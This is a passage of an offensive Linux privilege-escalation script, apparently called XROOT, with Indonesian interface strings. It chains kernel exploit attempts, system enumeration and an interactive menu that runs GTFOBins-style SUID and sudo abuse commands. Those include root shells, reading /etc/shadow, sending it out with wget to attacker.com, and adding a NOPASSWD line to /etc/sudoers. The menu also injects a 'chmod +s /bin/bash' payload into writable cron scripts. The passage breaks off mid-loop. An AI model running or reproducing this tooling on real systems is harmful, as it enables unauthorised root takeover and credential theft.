    }
    setuid(0);
    setgid(0);
    if (getuid() == 0) {
        printf("[+] ROOT ACHIEVED!\\n");
        system("id");
        return 0;
    }
    return 1;
}
'''
    binary = compile_code(code, "cve_2024_2000")
    if binary:
        output = run_command(binary, timeout=60)
        if is_root() or "ROOT" in output:
            show_root_info("CVE-2024-2000", output)
            return True
    return False


def check_prerequisites():
    print(f"{c('[*] checking...', 'cyan')}")
    if not WORK_DIRS:
        print(f"{c('[!] no writable dirs', 'red')}")
        return False
    compilers = []
    for comp in ['gcc', 'cc', 'clang']:
        if run_command(f"which {comp} 2>/dev/null").strip():
            compilers.append(comp)
    if not compilers:
        print(f"{c('[!] No C compiler found', 'red')}")
        print(f"{c('[!] Please install gcc, cc, or clang', 'yellow')}")
        return False
    print(f"{c('[+] Found compilers:', 'green')} {', '.join(compilers)}")
    print(f"{c('[+] Working directory:', 'green')} {WORK_DIRS[0]}")
    return True
def detect_environment():
    print(f"{c('[*] Detecting environment...', 'cyan')}")
    env_info = {}
    if os.path.exists("/proc/version"):
        with open("/proc/version") as f:
            env_info['proc_version'] = f.read().strip()
    if os.path.exists("/etc/os-release"):
        with open("/etc/os-release") as f:
            for line in f:
                if '=' in line:
                    key, val = line.strip().split('=', 1)
                    env_info[key] = val.strip('"')
    if os.path.exists("/proc/cpuinfo"):
        with open("/proc/cpuinfo") as f:
            for line in f:
                if line.startswith("model name"):
                    env_info['cpu'] = line.split(':')[1].strip()
                    break
    env_info['hostname'] = socket.gethostname()
    env_info['user'] = os.environ.get('USER', 'unknown')
    env_info['home'] = os.environ.get('HOME', 'unknown')
    env_info['shell'] = os.environ.get('SHELL', 'unknown')
    return env_info
def print_system_details():
    env = detect_environment()
    print(f"{c('┌- SYSTEM DETAILS -------------------------', 'cyan', True)}")
    if 'PRETTY_NAME' in env:
        print(f"{c('│', 'cyan')} OS: {env['PRETTY_NAME']}")
    if 'cpu' in env:
        print(f"{c('│', 'cyan')} CPU: {env['cpu']}")
    print(f"{c('│', 'cyan')} Hostname: {env.get('hostname', 'unknown')}")
    print(f"{c('│', 'cyan')} User: {env.get('user', 'unknown')}")
    print(f"{c('│', 'cyan')} Home: {env.get('home', 'unknown')}")
    print(f"{c('│', 'cyan')} Shell: {env.get('shell', 'unknown')}")
    print(f"{c('└-------------------------------------------', 'cyan')}\n")
def cleanup_temp_files():
    for work_dir in WORK_DIRS:
        try:
            for f in os.listdir(work_dir):
                if f.startswith('.test_') or f.startswith('cve_'):
                    try:
                        os.remove(os.path.join(work_dir, f))
                    except:
                        pass
        except:
            pass
def print_exploit_summary():
    print(f"\n{c('---------------------------------------------------------══', 'cyan', True)}")
    print(f"{c('EXPLOIT SUMMARY', 'green', True)}")
    print(f"{c('---------------------------------------------------------══', 'cyan', True)}\n")
    total_exploits = len(exploits)
    print(f"{c('Total Exploits Available:', 'cyan')} {c(str(total_exploits), 'green', True)}")
    years = {}
    for exploit_func in exploits:
        name = exploit_func.__name__
        if '_cve_' in name:
            year = name.split('_')[2][:4]
            years[year] = years.get(year, 0) + 1
    print(f"\n{c('Exploits by Year:', 'cyan')}")
    for year in sorted(years.keys(), reverse=True):
        print(f"  {year}: {c(str(years[year]), 'green')} exploits")
    print(f"\n{c('---------------------------------------------------------══', 'cyan', True)}\n")
def save_results(results_file='xroot_results.txt'):
    try:
        with open(results_file, 'w') as f:
            f.write("="*70 + "\n")
            f.write(f"XROOT v{VERSION} - Execution Results\n")
            f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*70 + "\n\n")
            f.write("System Information:\n")
            f.write(f"- Hostname: {socket.gethostname()}\n")
            f.write(f"- User: {os.environ.get('USER', 'unknown')}\n")
            f.write(f"- Kernel: {get_kernel_info().get('version_str', 'unknown')}\n")
            f.write(f"- Architecture: {get_kernel_info().get('arch', 'unknown')}\n")
            f.write("\n")
            f.write(f"Total Exploits Tested: {len(exploits)}\n")
            f.write("\n")
            if is_root():
                f.write("Status: ROOT ACCESS ACHIEVED\n")
                f.write("\nRoot Info:\n")
                f.write(f"whoami: {run_command('whoami').strip()}\n")
                f.write(f"id: {run_command('id').strip()}\n")
            else:
                f.write("Status: No successful exploitation\n")
        print(f"{c('[+] Results saved to:', 'green')} {results_file}")
    except Exception as e:
        print(f"{c('[!] Failed to save results:', 'red')} {e}")
def run_all_exploits():
    print(f"{c('[*] Starting exploitation sequence...', 'cyan', True)}\n")
    total = len(exploits)
    succeeded = False
    for i, exploit in enumerate(exploits, 1):
        progress = (i / total) * 100
        print(f"{c(f'[{progress:.1f}%]', 'gray')} Progress: {i}/{total}")
        try:
            if exploit():
                succeeded = True
                print(f"\n{c('='*70, 'green', True)}")
                print(f"{c('[✓] success!', 'green', True)}")
                print(f"{c('='*70, 'green', True)}\n")
                break
        except KeyboardInterrupt:
            print(f"\n{c('[!] Interrupted by user', 'yellow')}")
            break
        except Exception as e:
            print(f"{c('[ERROR]', 'red')} {exploit.__name__}: {str(e)}\n")
        time.sleep(0.3)
    return succeeded
def verify_exploit_integrity():
    print(f"{c('[*] Verifying exploit integrity...', 'cyan')}")
    verified = 0
    for exploit in exploits:
        if callable(exploit):
            verified += 1
    print(f"{c('[+] Verified exploits:', 'green')} {verified}/{len(exploits)}")
    return verified == len(exploits)
def check_kernel_modules():
    print(f"{c('[*] Checking loaded kernel modules...', 'cyan')}")
    modules = []
    if os.path.exists("/proc/modules"):
        with open("/proc/modules") as f:
            for line in f:
                module_name = line.split()[0]
                modules.append(module_name)
    relevant_modules = ['overlay', 'nf_tables', 'netfilter', 'bpf', 'io_uring']
    found = []
    for mod in relevant_modules:
        if any(mod in m for m in modules):
            found.append(mod)
    if found:
        print(f"{c('[+] Relevant modules found:', 'green')} {', '.join(found)}")
    return modules
def analyze_suid_binaries():
    print(f"{c('[*] Analyzing SUID binaries...', 'cyan')}")
    suid_bins = []
    search_paths = ['/bin', '/usr/bin', '/usr/local/bin', '/sbin', '/usr/sbin']
    for path in search_paths:
        if os.path.exists(path):
            try:
                for item in os.listdir(path):
                    full_path = os.path.join(path, item)
                    if os.path.isfile(full_path):
                        st = os.stat(full_path)
                        if st.st_mode & stat.S_ISUID:
                            suid_bins.append(full_path)
            except:
                pass
    if suid_bins:
        print(f"{c('[+] SUID binaries found:', 'green')} {len(suid_bins)}")
        for binary in suid_bins[:10]:
            print(f"  - {binary}")
    return suid_bins
def check_writable_paths():
    print(f"{c('[*] Checking writable paths...', 'cyan')}")
    writable = []
    check_paths = ['/tmp', '/var/tmp', '/dev/shm', '/run', '/var/run']
    for path in check_paths:
        if os.path.exists(path):
            if os.access(path, os.W_OK):
                writable.append(path)
    if writable:
        print(f"{c('[+] Writable paths:', 'green')} {', '.join(writable)}")
    return writable
def get_capabilities():
    print(f"{c('[*] Checking capabilities...', 'cyan')}")
    caps = run_command("getcap -r / 2>/dev/null")
    if caps:
        lines = [l for l in caps.split('\n') if l.strip()]
        if lines:
            print(f"{c('[+] Files with capabilities:', 'green')} {len(lines)}")
            for line in lines[:10]:
                print(f"  - {line}")
    return caps
def check_selinux_status():
    print(f"{c('[*] Checking SELinux status...', 'cyan')}")
    if os.path.exists("/sys/fs/selinux/enforce"):
        with open("/sys/fs/selinux/enforce") as f:
            status = f.read().strip()
            if status == "0":
                print(f"{c('[+] SELinux:', 'green')} Permissive")
            else:
                print(f"{c('[!] SELinux:', 'yellow')} Enforcing")
            return status
    else:
        print(f"{c('[+] SELinux:', 'green')} Not installed")
        return None
def check_apparmor_status():
    print(f"{c('[*] Checking AppArmor status...', 'cyan')}")
    status = run_command("aa-status 2>/dev/null")
    if "apparmor module is loaded" in status.lower():
        print(f"{c('[!] AppArmor:', 'yellow')} Active")
        return True
    else:
        print(f"{c('[+] AppArmor:', 'green')} Not active")
        return False
def detect_virtualization():
    print(f"{c('[*] Detecting virtualization...', 'cyan')}")
    virt_type = run_command("systemd-detect-virt 2>/dev/null").strip()
    if virt_type and virt_type != "none":
        print(f"{c('[!] Virtualization detected:', 'yellow')} {virt_type}")
        return virt_type
    if os.path.exists("/proc/cpuinfo"):
        with open("/proc/cpuinfo") as f:
            cpuinfo = f.read()
            if "hypervisor" in cpuinfo:
                print(f"{c('[!] Virtualization:', 'yellow')} Detected (hypervisor flag)")
                return "hypervisor"
    print(f"{c('[+] Virtualization:', 'green')} None detected")
    return None
def check_container():
    print(f"{c('[*] Checking for container environment...', 'cyan')}")
    if os.path.exists("/.dockerenv"):
        print(f"{c('[!] Container:', 'yellow')} Docker detected")
        return "docker"
    if os.path.exists("/run/.containerenv"):
        print(f"{c('[!] Container:', 'yellow')} Podman detected")
        return "podman"
    with open("/proc/1/cgroup", "r") as f:
        if "docker" in f.read():
            print(f"{c('[!] Container:', 'yellow')} Docker detected")
            return "docker"
    print(f"{c('[+] Container:', 'green')} None detected")
    return None
def enumerate_users():
    print(f"{c('[*] Enumerating users...', 'cyan')}")
    users = []
    if os.path.exists("/etc/passwd"):
        with open("/etc/passwd") as f:
            for line in f:
                if line.strip():
                    parts = line.split(':')
                    if len(parts) >= 7:
                        username = parts[0]
                        uid = parts[2]
                        shell = parts[6].strip()
                        if shell not in ['/usr/sbin/nologin', '/bin/false', '/sbin/nologin']:
                            users.append((username, uid, shell))
    if users:
        print(f"{c('[+] Interactive users found:', 'green')} {len(users)}")
        for username, uid, shell in users[:10]:
            print(f"  - {username} (UID: {uid}, Shell: {shell})")
    return users
def check_sudo_version():
    print(f"{c('[*] Checking sudo version...', 'cyan')}")
    sudo_version = run_command("sudo --version 2>/dev/null | head -1")
    if sudo_version:
        print(f"{c('[+] Sudo version:', 'green')} {sudo_version.strip()}")
        version_match = re.search(r'version (\d+\.\d+\.\d+)', sudo_version)
        if version_match:
            version = version_match.group(1)
            major, minor, patch = map(int, version.split('.'))
            if major == 1 and minor <= 8 and patch <= 31:
                print(f"{c('[!] WARNING:', 'yellow')} Sudo version may be vulnerable to CVE-2021-3156")
    return sudo_version
def check_polkit_version():
    print(f"{c('[*] Checking polkit version...', 'cyan')}")
    pkexec_version = run_command("pkexec --version 2>/dev/null")
    if pkexec_version:
        print(f"{c('[+] Polkit version:', 'green')} {pkexec_version.strip()}")
    return pkexec_version
def perform_full_enumeration():
    print(f"\n{c('---------------------------------------------------------══', 'cyan', True)}")
    print(f"{c('SYSTEM ENUMERATION', 'white', True)}")
    print(f"{c('---------------------------------------------------------══', 'cyan', True)}\n")
    verify_exploit_integrity()
    print()
    check_kernel_modules()
    print()
    analyze_suid_binaries()
    print()
    check_writable_paths()
    print()
    get_capabilities()
    print()
    check_selinux_status()
    print()
    check_apparmor_status()
    print()
    detect_virtualization()
    print()
    check_container()
    print()
    enumerate_users()
    print()
    check_sudo_version()
    print()
    check_polkit_version()
    print()
    print(f"{c('---------------------------------------------------------══', 'cyan', True)}\n")
import stat as _stat
import glob
import grp
def scan_suid_abuse():
    results = []
    gtfo = {
        "find":        "find . -exec /bin/sh -p \\; -quit",
        "vim":         "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
        "nmap":        "nmap --interactive => !sh",
        "less":        "less /etc/profile => !/bin/sh",
        "more":        "more /etc/profile => !/bin/sh",
        "awk":         "awk 'BEGIN {system(\"/bin/sh\")}'",
        "man":         "man man => !/bin/sh",
        "wget":        "wget --post-file=/etc/shadow attacker.com",
        "curl":        "curl file:///etc/shadow",
        "cp":          "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash -p",
        "mv":          "mv /bin/bash /tmp/bash; chmod +s /tmp/bash",
        "tee":         "echo 'user ALL=(ALL) NOPASSWD:ALL' | tee -a /etc/sudoers",
        "python":      "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
        "python3":     "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
        "perl":        "perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";'",
        "ruby":        "ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'",
        "bash":        "bash -p",
        "sh":          "sh -p",
        "dash":        "dash -p",
        "zsh":         "zsh",
        "env":         "env /bin/sh -p",
        "strace":      "strace -o /dev/null /bin/sh -p",
        "ltrace":      "ltrace /bin/sh -p",
        "gdb":         "gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit",
        "taskset":     "taskset 1 /bin/sh -p",
        "ionice":      "ionice /bin/sh -p",
        "nice":        "nice /bin/sh",
        "time":        "time /bin/sh",
        "timeout":     "timeout 7d /bin/sh -p",
        "watch":       "watch -x sh -c 'reset; exec sh 1>&0 2>&0'",
        "socat":       "socat stdin exec:/bin/sh",
        "tclsh":       "tclsh => exec /bin/sh -p",
        "expect":      "expect -c 'spawn /bin/sh;interact'",
        "node":        "node -e 'require(\"child_process\").spawn(\"/bin/sh\",[],{stdio:\"inherit\"})'",
        "php":         "php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'",
        "lua":         "lua -e 'os.execute(\"/bin/sh\")'",
        "ftp":         "ftp => !/bin/sh",
        "zip":         "zip /tmp/test.zip /tmp/test -T --unzip-command=\"sh -c /bin/sh\"",
        "tar":         "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
        "make":        "make -s --eval=$'x:\\n\\t-'\"$'\\t'\"'/bin/sh -p'",
        "gcc":         "gcc -wrapper /bin/sh,-s .",
        "as":          "as --traditional-format @/dev/stdin <<< 'x: .ascii \"/bin/sh\"'",
        "ld":          "ld -z execstack",
        "dd":          "dd if=/bin/sh of=/tmp/sh; chmod +s /tmp/sh",
        "xxd":         "xxd /etc/shadow | xxd -r",
        "od":          "od -An -c /etc/shadow",
        "hexdump":     "hexdump -C /etc/shadow",
        "base64":      "base64 /etc/shadow | base64 -d",
        "openssl":     "openssl enc -in /etc/shadow",
        "ssh":         "ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
        "rsync":       "rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
        "screen":      "screen -D -m sh -p",
        "tmux":        "tmux new-session sh",
        "git":         "git -p help config => !/bin/sh",
        "svn":         "svn help => !/bin/sh",
        "ed":          "ed => !/bin/sh",
        "nano":        "nano => ^R^X => reset; sh 1>&0 2>&0",
        "pico":        "pico => ^R^X",
        "joe":         "joe => ^[ => !sh",
        "jq":          "jq -r '.+\"test\"' /dev/null => exec /bin/sh",
        "cut":         "cut -d '' -f1 /etc/shadow",
        "grep":        "grep '' /etc/shadow",
        "sed":         "sed -n 'w /output' /etc/shadow",
        "sort":        "sort /etc/shadow",
        "uniq":        "uniq /etc/shadow",
        "head":        "head -c1G /etc/shadow",
        "tail":        "tail -c1G /etc/shadow",
        "cat":         "cat /etc/shadow",
        "tac":         "tac /etc/shadow",
        "rev":         "rev /etc/shadow",
        "strings":     "strings /etc/shadow",
        "file":        "file -f /etc/shadow",
        "diff":        "diff /dev/urandom /etc/shadow",
        "cmp":         "cmp /dev/urandom /etc/shadow",
        "chmod":       "chmod +s /bin/bash",
        "chown":       "chown root /tmp/shell; chmod +s /tmp/shell",
    }
    search_paths = ['/bin','/usr/bin','/usr/local/bin','/sbin','/usr/sbin','/usr/local/sbin']
    for path in search_paths:
        if not os.path.exists(path): continue
        try:
            for item in os.listdir(path):
                fp = os.path.join(path, item)
                try:
                    st = os.stat(fp)
                    if st.st_mode & _stat.S_ISUID:
                        name = os.path.basename(fp)
                        cmd  = gtfo.get(name, None)
                        results.append({"binary": fp, "name": name, "cmd": cmd})
                except: pass
        except: pass
    return results
def scan_sudo_abuse():
    results = []
    out = run_command("sudo -l 2>/dev/null")
    if not out: return results
    gtfo_sudo = {
        "find":    "sudo find . -exec /bin/sh \\; -quit",
        "vim":     "sudo vim -c ':!sh'",
        "vi":      "sudo vi -c ':!sh'",
        "awk":     "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
        "nmap":    "sudo nmap --interactive",
        "less":    "sudo less /etc/passwd => !/bin/sh",
        "more":    "sudo more /etc/passwd => !/bin/sh",
        "python":  "sudo python -c 'import os; os.system(\"/bin/sh\")'",
        "python3": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
        "perl":    "sudo perl -e 'exec \"/bin/sh\";'",
        "ruby":    "sudo ruby -e 'exec \"/bin/sh\"'",
        "bash":    "sudo bash",
        "sh":      "sudo sh",
        "tar":     "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
        "zip":     "sudo zip /tmp/test /etc/hosts -T --unzip-command=\"sh -c /bin/sh\"",
        "env":     "sudo env /bin/sh",
        "man":     "sudo man man => !/bin/sh",
        "git":     "sudo git -p help => !/bin/sh",
        "ftp":     "sudo ftp => !/bin/sh",
        "nano":    "sudo nano /etc/passwd => ^R^X",
        "tclsh":   "sudo tclsh => exec /bin/sh",
        "expect":  "sudo expect -c 'spawn /bin/sh;interact'",
        "node":    "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",[],{stdio:\"inherit\"})'",
        "php":     "sudo php -r 'system(\"/bin/sh\");'",
        "lua":     "sudo lua -e 'os.execute(\"/bin/sh\")'",
        "ed":      "sudo ed => !/bin/sh",
        "screen":  "sudo screen /bin/sh",
        "tmux":    "sudo tmux new-session sh",
        "rsync":   "sudo rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
        "ssh":     "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
        "curl":    "sudo curl file:///etc/shadow",
        "wget":    "sudo wget --post-file=/etc/shadow attacker.com",
        "socat":   "sudo socat stdin exec:/bin/sh",
        "strace":  "sudo strace /bin/sh",
        "ltrace":  "sudo ltrace /bin/sh",
        "chmod":   "sudo chmod +s /bin/bash",
        "chown":   "sudo chown root:root /bin/bash && sudo chmod +s /bin/bash",
        "cp":      "sudo cp /bin/bash /tmp/bash && sudo chmod +s /tmp/bash",
        "mv":      "sudo mv /bin/bash /tmp/bash && sudo chmod +s /tmp/bash",
        "cat":     "sudo cat /etc/shadow",
        "tee":     "echo 'user ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers",
        "dd":      "sudo dd if=/etc/shadow",
        "base64":  "sudo base64 /etc/shadow | base64 -d",
        "openssl": "sudo openssl enc -in /etc/shadow",
        "sed":     "sudo sed -n 'w /dev/stdout' /etc/shadow",
        "awk":     "sudo awk '{print}' /etc/shadow",
        "xxd":     "sudo xxd /etc/shadow",
        "od":      "sudo od -c /etc/shadow",
        "hexdump": "sudo hexdump -C /etc/shadow",
        "diff":    "sudo diff /dev/urandom /etc/shadow",
        "strings": "sudo strings /etc/shadow",
        "file":    "sudo file /etc/shadow",
        "gcc":     "sudo gcc -wrapper /bin/sh,-s .",
        "make":    "sudo make -s --eval=$'x:\\n\\t-'\"$'\\t'\"'/bin/sh'",
        "taskset": "sudo taskset 1 /bin/sh",
        "ionice":  "sudo ionice /bin/sh",
        "nice":    "sudo nice /bin/sh",
        "timeout": "sudo timeout 7d /bin/sh",
        "watch":   "sudo watch -x sh -c 'reset; exec sh'",
        "ALL":     "sudo /bin/sh",
    }
    lines = out.split('\n')
    for line in lines:
        line = line.strip()
        if 'NOPASSWD' in line or '(ALL)' in line or '(root)' in line:
            for binary, cmd in gtfo_sudo.items():
                if binary in line:
                    results.append({"rule": line, "binary": binary, "cmd": cmd})
                    break
            else:
                if line: results.append({"rule": line, "binary": "unknown", "cmd": "Check manually"})
    return results
def scan_cron_abuse():
    results = []
    cron_paths = [
        '/etc/crontab', '/etc/cron.d/', '/etc/cron.daily/', '/etc/cron.hourly/',
        '/etc/cron.weekly/', '/etc/cron.monthly/', '/var/spool/cron/',
        '/var/spool/cron/crontabs/', '/tmp/cron*'
    ]
    for cp in cron_paths:
        for fp in glob.glob(cp) if '*' in cp else [cp]:
            if os.path.isdir(fp):
                try:
                    for f in os.listdir(fp):
                        full = os.path.join(fp, f)
                        if os.path.isfile(full):
                            _check_cron_file(full, results)
                except: pass
            elif os.path.isfile(fp):
                _check_cron_file(fp, results)
    out = run_command("crontab -l 2>/dev/null")
    if out:
        for line in out.split('\n'):
            line = line.strip()
            if line and not line.startswith('#') and not line.startswith('@'):
                parts = line.split()
                if len(parts) >= 6:
                    script = parts[5]
                    writable = os.access(script, os.W_OK) if os.path.exists(script) else False
                    results.append({"file": "crontab -l", "line": line, "script": script, "writable": writable})
    return results
def _check_cron_file(fp, results):
    try:
        with open(fp) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'): continue
                parts = line.split()
                if len(parts) < 6: continue
                script = parts[5] if not parts[5].startswith('@') else (parts[1] if len(parts) > 1 else '')
                if not script: continue
                writable = os.access(script, os.W_OK) if os.path.exists(script) else False
                dir_writable = os.access(os.path.dirname(script), os.W_OK) if os.path.dirname(script) else False
                if writable or dir_writable or not os.path.exists(script):
                    results.append({"file": fp, "line": line, "script": script, "writable": writable, "dir_writable": dir_writable, "missing": not os.path.exists(script)})
    except: pass
def scan_writable_path():
    results = []
    path_env = os.environ.get('PATH', '')
    dirs = path_env.split(':')
    system_dirs = {'/bin', '/usr/bin', '/sbin', '/usr/sbin', '/usr/local/bin'}
    for i, d in enumerate(dirs):
        if not d: continue
        if d in system_dirs: break
        if os.path.exists(d) and os.access(d, os.W_OK):
            results.append({"dir": d, "position": i, "before_system": True})
        elif not os.path.exists(d):
            parent = os.path.dirname(d)
            if parent and os.access(parent, os.W_OK):
                results.append({"dir": d, "position": i, "missing": True, "parent_writable": True})
    writable_common = ['/tmp', '/var/tmp', '/dev/shm']
    for d in writable_common:
        if os.access(d, os.W_OK) and d not in [r['dir'] for r in results]:
            in_path = d in dirs
            idx     = dirs.index(d) if in_path else 999
            before  = idx < min((dirs.index(sd) for sd in system_dirs if sd in dirs), default=999)
            results.append({"dir": d, "position": idx, "in_path": in_path, "before_system": before})
    return results
def scan_docker_escape():
    results = []
    if os.path.exists("/.dockerenv"):
        results.append({"type": "docker", "detail": "/.dockerenv exists"})
    if os.path.exists("/run/.containerenv"):
        results.append({"type": "podman", "detail": "/run/.containerenv exists"})
    try:
        with open("/proc/1/cgroup") as f:
            cg = f.read()
            if 'docker' in cg:    results.append({"type": "docker_cgroup", "detail": "docker in cgroup"})
            if 'lxc' in cg:       results.append({"type": "lxc", "detail": "lxc in cgroup"})
            if 'kubepods' in cg:  results.append({"type": "kubernetes", "detail": "kubernetes pod"})
    except: pass
    if results:
        out = run_command("cat /proc/self/status 2>/dev/null")
        caps = ""
        for line in (out or "").split('\n'):
            if 'CapEff' in line:
                caps = line.split()[-1] if line.split() else ""
        if caps:
            try:
                cap_val = int(caps, 16)
                dangerous = []
                if cap_val & (1 << 21): dangerous.append("CAP_SYS_ADMIN")
                if cap_val & (1 << 0):  dangerous.append("CAP_CHOWN")
                if cap_val & (1 << 7):  dangerous.append("CAP_SETUID")
                if cap_val & (1 << 27): dangerous.append("CAP_SYS_PTRACE")
                if cap_val & (1 << 6):  dangerous.append("CAP_SETGID")
                if dangerous:
                    results.append({"type": "dangerous_caps", "caps": dangerous})
            except: pass
        if os.path.exists("/dev/sda") or os.path.exists("/dev/xvda"):
            results.append({"type": "host_disk", "detail": "Host disk accessible"})
        out2 = run_command("mount 2>/dev/null")
        if '/etc/passwd' in (out2 or '') or '/etc/shadow' in (out2 or ''):
            results.append({"type": "sensitive_mount", "detail": "Sensitive host path mounted"})
    return results
def print_scan_results(suid, sudo, cron, writable, docker):
    sep = "═" * 60
    print(f"\n{c(sep, 'cyan')}")
    print(f"{c('  SCAN RESULTS', 'green', True)}")
    print(f"{c(sep, 'cyan')}\n")
    print(f"{c('  [SUID ABUSE]', 'yellow', True)} - {len(suid)} binary ditemukan")
    if suid:
        exploitable = [s for s in suid if s['cmd']]
        print(f"  {c('Exploitable via GTFOBins:', 'green')} {len(exploitable)}")
        for s in exploitable[:15]:
            print(f"    {c('●', 'green')} {s['binary']}")
            print(f"      {c('CMD:', 'cyan')} {s['cmd']}")
    else:
        print(f"  {c('none', 'red')}")
    print(f"\n{c('  [SUDO ABUSE]', 'yellow', True)} - {len(sudo)} rule ditemukan")
    if sudo:
        for s in sudo:
            print(f"    {c('●', 'green')} Rule : {s['rule']}")
            if s['cmd'] != 'Check manually':
                print(f"      {c('CMD:', 'cyan')} {s['cmd']}")
    else:
        print(f"  {c('none', 'red')}")
    print(f"\n{c('  [CRON ABUSE]', 'yellow', True)} - {len(cron)} job rentan ditemukan")
    if cron:
        for cr in cron[:10]:
            flags = []
            if cr.get('writable'):     flags.append(c('WRITABLE', 'green'))
            if cr.get('dir_writable'): flags.append(c('DIR_WRITABLE', 'yellow'))
            if cr.get('missing'):      flags.append(c('MISSING_SCRIPT', 'red'))
            print(f"    {c('●', 'green')} {cr['script']} [{' | '.join(flags)}]")
            print(f"      {c('File:', 'cyan')} {cr['file']}")
    else:
        print(f"  {c('none', 'red')}")
    print(f"\n{c('  [PATH HIJACK]', 'yellow', True)} - {len(writable)} path rentan")
    if writable:
        for w in writable:
            flag = c('WRITABLE', 'green') if w.get('before_system') else c('WRITABLE (not in PATH)', 'yellow')
            print(f"    {c('●', 'green')} {w['dir']} [{flag}]")
            print(f"      {c('Cara:', 'cyan')} Buat binary palsu di sini, tunggu root eksekusi")
    else:
        print(f"  {c('none', 'red')}")
    print(f"\n{c('  [DOCKER/LXC ESCAPE]', 'yellow', True)} - {len(docker)} vektor ditemukan")
    if docker:
        for d in docker:
            print(f"    {c('●', 'green')} {d['type']}: {d.get('detail','')}")
            if d['type'] == 'dangerous_caps':
                print(f"      {c('Caps:', 'red')} {', '.join(d['caps'])}")
    else:
        print(f"  {c('Tidak ada container atau escape vector', 'red')}")
    print(f"\n{c(sep, 'cyan')}\n")
def prompt_exploit(suid, sudo, cron, writable, docker):
    has_vuln = any([
        any(s['cmd'] for s in suid),
        sudo,
        cron,
        any(w.get('before_system') for w in writable),
        docker
    ])
    if not has_vuln:
        print(f"{c('[!] no vectors found', 'red')}")
        print(f"{c('[*] Lanjut ke kernel exploit...', 'cyan')}")
        return False
    print(f"{c('[?] Mau exploit sekarang?', 'yellow', True)}")
    print(f"  {c('1', 'cyan')} - SUID abuse")
    print(f"  {c('2', 'cyan')} - SUDO abuse")
    print(f"  {c('3', 'cyan')} - Cron job abuse")
    print(f"  {c('4', 'cyan')} - PATH hijack")
    print(f"  {c('5', 'cyan')} - Docker/LXC escape")
    print(f"  {c('6', 'cyan')} - Kernel exploit (auto semua CVE)")
    print(f"  {c('0', 'cyan')} - Skip, keluar\n")
    try:
        choice = input(f"  {c('Pilihan [0-6]:', 'yellow')} ").strip()
    except (EOFError, KeyboardInterrupt):
        return False
    if choice == '1':
        exploitable = [s for s in suid if s['cmd']]
        if not exploitable:
            print(f"{c('[!] Tidak ada SUID exploitable', 'red')}")
            return False
        print(f"\n{c('[*] Coba SUID exploit...', 'cyan')}")
        for s in exploitable:
            print(f"\n  {c('►', 'green')} {s['binary']}")
            print(f"  {c('CMD:', 'cyan')} {s['cmd']}")
            try:
                go = input(f"  {c('Jalankan? (y/n):', 'yellow')} ").strip().lower()
            except: continue
            if go == 'y':
                out = run_command(s['cmd'].split('=>')[0].strip())
                if out: print(f"\n{c(out, 'green')}")
                if is_root():
                    show_root_info("SUID-" + s['name'], out or "")
                    return True
    elif choice == '2':
        if not sudo:
            print(f"{c('[!] Tidak ada sudo rule exploitable', 'red')}")
            return False
        print(f"\n{c('[*] Coba SUDO exploit...', 'cyan')}")
        for s in sudo:
            if s['cmd'] == 'Check manually': continue
            print(f"\n  {c('►', 'green')} {s['binary']}")
            print(f"  {c('Rule:', 'cyan')} {s['rule']}")
            print(f"  {c('CMD:', 'cyan')} {s['cmd']}")
            try:
                go = input(f"  {c('Jalankan? (y/n):', 'yellow')} ").strip().lower()
            except: continue
            if go == 'y':
                out = run_command(s['cmd'])
                if out: print(f"\n{c(out, 'green')}")
                if is_root():
                    show_root_info("SUDO-" + s['binary'], out or "")
                    return True
    elif choice == '3':
        if not cron:
            print(f"{c('[!] none', 'red')}")
            return False
        print(f"\n{c('[*] Cron abuse...', 'cyan')}")
        for cr in cron:
            script = cr['script']
            print(f"\n  {c('►', 'green')} {script}")
            if cr.get('writable'):
                print(f"  {c('Script WRITABLE - bisa ditulis ulang!', 'green')}")
                payload = "#!/bin/bash\nchmod +s /bin/bash\n"
                try:
                    go = input(f"  {c('Inject payload chmod +s /bin/bash? (y/n):', 'yellow')} ").strip().lower()
                except: continue
                if go == 'y':
                    try:
                        with open(script, 'w') as f: f.write(payload)
                        print(f"  {c('[✓] Payload diinjek. Tunggu cron jalan...', 'green')}")
                        print(f"  {c('[*] Cek dengan: ls -la /bin/bash', 'cyan')}")
                    except Exception as e:
                        print(f"  {c(f'[!] Gagal: {e}', 'red')}")
            elif cr.get('missing'):
                print(f"  {c('Script MISSING - bisa dibuat!', 'green')}")
                try:
                    go = input(f"  {c('Buat script payload? (y/n):', 'yellow')} ").strip().lower()
                except: continue
                if go == 'y':
                    try:
                        os.makedirs(os.path.dirname(script), exist_ok=True)
                        with open(script, 'w') as f:
                            f.write("#!/bin/bash\nchmod +s /bin/bash\n")
                        os.chmod(script, 0o755)
                        print(f"  {c('[✓] Script dibuat. Tunggu cron jalan...', 'green')}")
                    except Exception as e:
                        print(f"  {c(f'[!] Gagal: {e}', 'red')}")
    elif choice == '4':
        wlist = [w for w in writable if w.get('before_system') or w.get('in_path')]
        if not wlist:
            print(f"{c('[!] Tidak ada PATH hijack yang feasible', 'red')}")
            return False
        print(f"\n{c('[*] PATH hijack...', 'cyan')}")
        common_cmds = ['ls','ps','id','whoami','sudo','crontab','service','systemctl']
        print(f"  {c('Common commands yang sering dipanggil root:', 'cyan')}")
        for cmd in common_cmds:
